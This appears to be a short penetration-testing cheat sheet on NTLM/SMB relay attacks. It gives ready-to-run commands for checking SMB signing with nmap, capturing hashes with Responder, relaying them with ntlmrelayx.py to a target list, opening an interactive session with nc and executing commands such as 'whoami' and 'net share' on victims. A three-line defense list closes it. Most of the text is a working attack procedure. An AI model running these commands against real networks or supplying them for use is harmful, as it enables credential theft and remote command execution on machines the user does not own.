# NTLM Relay / SMB Relay Attack

Relay captured NTLM hashes to other systems (requires SMB signing disabled).

## Check SMB Signing
```bash
$ nmap --script=smb2-security-mode.nse -p445 192.168.1.100 -Pn
```

Look for: "Message signing: disabled" or "enabled but not required"

## Attack
```bash
# Terminal 1 - Capture
$ sudo responder -I eth0 -dvPv

# Terminal 2 - Relay
$ sudo ntlmrelayx.py -tf targets.txt -smb2support -i

# Terminal 3 - Connect
$ nc 127.0.0.1 11000
```

## Commands
```bash
$ sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
$ sudo ntlmrelayx.py -tf targets.txt -smb2support -c "cmd /c net share"
```

## Defense
- Enable SMB signing (required)
- Disable LLMNR/NBT-NS
- Network segmentation
